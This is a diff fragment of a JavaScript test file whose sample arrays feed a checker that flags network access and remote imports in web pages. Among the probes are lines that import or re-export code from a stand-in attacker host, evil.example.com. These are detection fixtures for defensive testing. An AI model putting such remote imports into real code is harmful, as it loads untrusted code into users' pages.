@@ -358,7 +358,7 @@ const NET_PROBES = ['import("https://evil.example.com/x.js");', "const x = '\\\\
 const NET_CLEAN = ["const s = 'a//b'; const u = '/api/read'; const p = x.split('//');", "const re = new RegExp('\\\\b(?:cold)\\\\b'); const e = s.replace(r, '\\\\$&');", "el('button', { type: 'button' });", 'const prefetch = 1;'];
 const IMPORT_PROBES = ["import { OrbitControls } from 'three/addons/controls/OrbitControls.js';", "import x from 'lodash';",
   "export * from 'https://evil.example.com/x.js';"];
-const IMPORT_CLEAN = "import * as THREE from 'three';\nimport { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';\nimport { a } from './a.js';";
+const IMPORT_CLEAN = "import { a } from './a.js';\nimport { b } from '../b.js';";
 const TABLE_PROBES = [{ 'a.html': { allow: ['https://cdn.jsdelivr.net'], bare: [] } }, { 'a.html': { allow: ['https://a.example.com/x/'], bare: ['https://b.example.com/'] } },
   { 'a.html': { allow: ['http://a.example.com/'], bare: [] } }];
 /* 字体を読まないページの見本。CSP を付けた頭の後ろに、見本の 1 行を足して試す */
